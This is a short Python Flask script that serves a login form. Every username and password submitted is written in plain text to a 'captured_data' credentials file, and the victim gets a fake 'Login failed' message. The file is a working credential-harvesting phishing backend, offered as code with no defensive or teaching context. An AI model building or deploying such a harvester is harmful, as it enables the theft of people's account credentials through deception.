from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Ensure the credentials file exists
if not os.path.exists('captured_data'):
    os.makedirs('captured_data')
with open('captured_data/credentials.txt', 'a') as f:
    pass

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        with open('captured_data/credentials.txt', 'a') as f:
            f.write(f"Username: {user} | Password: {pwd}\n")
        return "<h3>Login failed. Try again later.</h3>"
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)

